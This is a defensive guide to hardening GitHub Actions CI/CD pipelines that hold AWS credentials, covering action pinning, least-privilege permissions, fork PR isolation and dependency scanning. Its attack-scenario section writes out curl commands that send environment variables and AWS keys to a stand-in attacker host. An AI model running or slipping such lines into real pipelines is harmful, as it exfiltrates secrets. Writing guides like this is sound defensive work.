# CI/CD Pipeline Hardening

## The Problem

CI/CD pipelines run with elevated AWS permissions and pull third-party code. A malicious or compromised action/plugin can exfiltrate secrets, modify deployments, or pivot to your AWS account.

---

## Attack Scenarios

```bash
# Scenario 1 — Malicious third-party GitHub Action
- uses: some-org/some-action@v1  # v1 tag can be moved to point to malicious code
# Attacker updates what v1 points to — your pipeline now runs their code with your AWS creds

# Scenario 2 — Supply chain attack via npm/pip
- run: npm install  # package.json has a dependency with a postinstall script
# postinstall script runs: curl https://attacker.com -d "$(env)"
# All your CI env vars (including AWS creds) are exfiltrated

# Scenario 3 — PR from fork modifies workflow
# External contributor opens PR that modifies .github/workflows/deploy.yml
# If allowed, they can add: curl https://attacker.com -d "$AWS_ACCESS_KEY_ID"
```

---

## Detection

```bash
# Audit third-party actions in your workflows — find mutable tag references
grep -r "uses:" .github/workflows/ | grep -v "@[a-f0-9]\{40\}"
# Any result using @v1, @main, @latest instead of a commit SHA is a risk

# Check workflow permissions — find workflows with excessive permissions
grep -r "permissions:" .github/workflows/
grep -r "write-all" .github/workflows/

# Find workflows triggered on pull_request from forks with write permissions
grep -r "pull_request:" .github/workflows/
# Then check if those workflows have id-token: write or secrets access
```

---

## Fix 1 — Pin Third-Party Actions to Commit SHA

```yaml
# Bad — mutable tag, can be hijacked
- uses: aws-actions/configure-aws-credentials@v4

# Good — pinned to exact commit, immutable
- uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2

# How to find the SHA:
# 1. Go to the action's GitHub repo
# 2. Click on the tag (e.g., v4)
# 3. Copy the full commit SHA from the URL
# 4. Add a comment with the version for readability
```

---

## Fix 2 — Minimal Workflow Permissions

```yaml
# Bad — grants write permissions to everything by default
name: Deploy
on: push

jobs:
  deploy:
    runs-on: ubuntu-latest  # No permissions block = inherits repo defaults

# Good — deny all, grant only what's needed
name: Deploy
on: push

permissions: {}  # Deny everything at workflow level

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write    # Only for OIDC
      contents: read     # Only to checkout code
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

---

## Fix 3 — Separate Pipelines by Environment

```yaml
# PR builds — no AWS access, just test and lint
name: PR Check
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test
      # No AWS credentials here

---
# Deploy — only on main branch merge, with AWS OIDC
name: Deploy to Production
on:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # Requires manual approval in GitHub
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: arn:aws:iam::123456789:role/GitHubActionsDeployRole
          aws-region: ap-south-1
```

---

## Fix 4 — Restrict Fork PR Access to Secrets

```yaml
# Workflows triggered by pull_request from forks should NOT have secret access
# Use pull_request_target carefully — it runs in the context of the base branch

# Safe pattern for fork PRs:
on:
  pull_request:
    # This runs in fork context — no secrets, read-only
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    # No permissions block here — defaults to read-only for fork PRs
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test
      # Never add AWS credentials to fork PR workflows
```

---

## Fix 5 — Dependency Scanning

```bash
# Scan for vulnerable dependencies before deploying
# Add to your pipeline:

# Node.js
npm audit --audit-level=high
# Fail the build if high or critical vulnerabilities found

# Python
pip install safety
safety check -r requirements.txt

# Docker images
docker scout cves my-app:latest
# or
trivy image my-app:latest --exit-code 1 --severity HIGH,CRITICAL

# Infrastructure as code scanning
pip install checkov
checkov -d . --framework terraform --soft-fail
```

---

## Fix 6 — Audit Trail for Deployments

```bash
# Tag every deployed resource with the pipeline run that created it
aws ec2 create-tags \
  --resources i-0123456789abcdef0 \
  --tags \
    Key=DeployedBy,Value=github-actions \
    Key=DeployCommit,Value=$GITHUB_SHA \
    Key=DeployWorkflow,Value=$GITHUB_WORKFLOW \
    Key=DeployRunId,Value=$GITHUB_RUN_ID

# Store deployment record in SSM Parameter Store
aws ssm put-parameter \
  --name /deployments/prod/latest \
  --value "{\"commit\": \"$GITHUB_SHA\", \"deployed_at\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\", \"deployed_by\": \"$GITHUB_ACTOR\"}" \
  --type String \
  --overwrite
```

---

## Checklist

- [ ] All third-party actions pinned to full commit SHA
- [ ] Workflow-level `permissions: {}` set, individual jobs grant only what's needed
- [ ] PR workflows (especially from forks) have no AWS credentials
- [ ] Separate roles per environment — dev, staging, prod
- [ ] Production deploys require manual approval (GitHub Environments)
- [ ] Dependency scanning (`npm audit`, `trivy`, `checkov`) in pipeline
- [ ] Deployment metadata tagged on AWS resources for audit trail
- [ ] `pull_request_target` workflows reviewed carefully — they have secret access
